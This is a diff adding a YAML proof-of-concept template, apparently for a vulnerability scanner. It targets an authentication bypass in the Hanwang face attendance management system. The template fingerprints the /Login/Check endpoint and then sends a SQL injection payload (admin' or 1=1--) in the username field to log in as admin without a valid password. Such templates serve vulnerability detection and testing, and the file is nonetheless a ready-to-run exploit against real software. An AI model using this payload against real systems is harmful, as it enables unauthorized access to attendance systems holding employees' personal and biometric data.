@@ -1,0 +1,19 @@
+id: poc-yaml-hanwang-face-attendance-management-system-bypass-authentication-Login
+info:
+  name: 汉王人脸考勤管理系统绕过验证登录漏洞
+  severity: high
+  tags:
+  - 认证绕过
+  finger: ASP.NET
+requests:
+- method: GET
+  path: /Login/Check
+  expression: status_code == 200  && contains(body,"cancel")
+- method: POST
+  path: /Login/Check
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: strName=admin' or 1=1--&strPwd=admin
+  expression: status_code == 200  && body=="ok"
+variables: {}
+transport: http
